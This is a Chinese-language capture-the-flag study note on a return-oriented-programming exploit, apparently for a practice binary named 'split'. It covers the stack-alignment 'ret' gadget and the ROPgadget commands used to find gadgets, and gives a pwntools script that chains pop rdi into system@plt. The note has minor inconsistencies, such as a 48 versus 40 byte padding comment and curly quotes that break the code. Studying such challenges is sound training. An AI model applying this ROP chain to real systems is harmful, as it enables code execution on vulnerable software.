payload = 垃圾数据 + ret + pop_rdi_ret + binsh_addr + system_plt

1.注意这个“ret”【我一直做不出来的原因！】

1）
ret的作用是“对齐”
根源：System V AMD64 ABI 的对齐要求
x86-64 的调用约定规定：在函数入口处，RSP 必须是 16 字节对齐的

[高地址]
+0x20 | system_plt ← esp+0x20，system 返回后 pop 这里
+0x18 | binsh_addr ← esp+0x18，被 pop rdi 吃掉
+0x10 | pop_rdi_ret ← esp+0x10，pop rdi; ret
+0x08 | ret_gadget ← esp+0x08，只做 ret，抬栈 8 字节解决对齐
+0x00 | 垃圾数据*N ← 覆盖 buffer + saved rbp
[低地址]

2）如何获得“ret”？

在文件所在目录打开终端，直接输入：
ROPgadget –binary ./vuln –only “ret”
会输出：
0x000000000040053e : ret

2.如何获得“pop_rdi_ret”？

在文件所在目录打开终端，直接输入：
ROPgadget –binary ./文件名| grep “pop rdi ; ret”
会直接输出：
0x00000000004007c3 : pop rdi ; ret

答案：
from pwn import *
io = process(‘./split’)

优先尝试48字节padding

padding = b’A’ * 40
pop_rdi = p64(0x00000000004007c3)
cat_string = p64(0x0000000000601060)
system_plt = p64(0x0000000000400560)

补充单ret用于栈对齐，自行替换你查到的ret地址

ret = p64(0x000000000040053e)

#payload = 垃圾数据 + ret + pop_rdi_ret + binsh_addr + system_plt
payload = padding + ret + pop_rdi + cat_string + system_plt
io.send(payload)
io.interactive()
